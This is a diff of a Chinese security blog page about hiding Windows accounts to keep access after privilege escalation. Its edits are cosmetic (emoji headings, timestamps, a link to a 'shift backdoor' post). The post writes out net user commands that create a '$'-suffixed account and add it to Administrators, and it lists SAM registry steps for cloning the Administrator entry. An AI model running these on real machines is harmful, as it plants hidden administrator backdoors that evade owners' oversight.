@@ -16,12 +16,12 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0、简介提权成功后，维持权限可以添加隐藏账户。 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   2、注册表隐藏 更改 HKEY_LOCAL_MACHIN">
+    <meta name="description" content="🚀 0、简介提权成功后，维持权限可以添加隐藏账户。 📌 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   📌 2、注册表隐藏 更改 HKEY_LOC">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows系统添加隐藏账户">
 <meta property="og:url" content="http://example.com/2019/12/06/Windows%E7%B3%BB%E7%BB%9F%E6%B7%BB%E5%8A%A0%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
-<meta property="og:description" content="0、简介提权成功后，维持权限可以添加隐藏账户。 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   2、注册表隐藏 更改 HKEY_LOCAL_MACHIN">
+<meta property="og:description" content="🚀 0、简介提权成功后，维持权限可以添加隐藏账户。 📌 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password &#x2F;addnet localgroup administrators hacker$ &#x2F;add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   📌 2、注册表隐藏 更改 HKEY_LOC">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206164548.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206151940.png">
@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206160517.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206161451-1024x726.png">
 <meta property="article:published_time" content="2019-12-06T08:27:25.000Z">
-<meta property="article:modified_time" content="2025-07-11T03:50:32.685Z">
+<meta property="article:modified_time" content="2025-07-11T05:20:36.366Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="后门">
 <meta property="article:tag" content="小技巧">
@@ -344,7 +344,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年7月11日 中午
+                    本文最后更新于 2025年7月11日 下午
                   
                 
               </p>
@@ -352,15 +352,15 @@
             
               <div class="markdown-body">
                 
-                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>提权成功后，维持权限可以添加隐藏账户。</p>
-<h4 id="1、命令行隐藏"><a href="#1、命令行隐藏" class="headerlink" title="1、命令行隐藏"></a>1、命令行隐藏</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户时使用$符号,这样添加的用户,命令行不会显示</span><br>net user hacker$ password /add<br>net localgroup administrators hacker$ /add<br></code></pre></td></tr></table></figure>
+                <h4 id="🚀-0、简介"><a href="#🚀-0、简介" class="headerlink" title="🚀 0、简介"></a>🚀 0、简介</h4><p>提权成功后，维持权限可以添加隐藏账户。</p>
+<h4 id="📌-1、命令行隐藏"><a href="#📌-1、命令行隐藏" class="headerlink" title="📌 1、命令行隐藏"></a>📌 1、命令行隐藏</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户时使用$符号,这样添加的用户,命令行不会显示</span><br>net user hacker$ password /add<br>net localgroup administrators hacker$ /add<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206164548.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <ul>
 <li>在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户</li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191206151940.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="2、注册表隐藏"><a href="#2、注册表隐藏" class="headerlink" title="2、注册表隐藏"></a>2、注册表隐藏</h4><ol>
+<h4 id="📌-2、注册表隐藏"><a href="#📌-2、注册表隐藏" class="headerlink" title="📌 2、注册表隐藏"></a>📌 2、注册表隐藏</h4><ol>
 <li>更改 <em>HKEY_LOCAL_MACHINE\SAM\SAM</em> 权限，为 Administrators 组添加权限 </li>
 <li>F5刷新一下,在注册表中找到 <em>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\hacker$</em> ，找到其类型<em>000003EB</em>后和 <em>hacker</em>$一同导出 </li>
 <li>找到 <em>Administrator</em> 对应类型 <em>000001F4</em> 导出，编辑导出的文件 </li>
@@ -423,9 +423,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2019/12/06/%E5%88%B6%E4%BD%9C%20winRAR%20%E5%90%8E%E9%97%A8/" title="制作 winRAR 后门">
+                      <a href="/2019/12/06/%E5%88%B6%E4%BD%9C%20shift%20%E5%90%8E%E9%97%A8%EF%BC%8C%E7%BB%B4%E6%8C%81%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/" title="制作 shift 后门，维持访问权限">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">制作 winRAR 后门</span>
+                        <span class="hidden-mobile">制作 shift 后门，维持访问权限</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
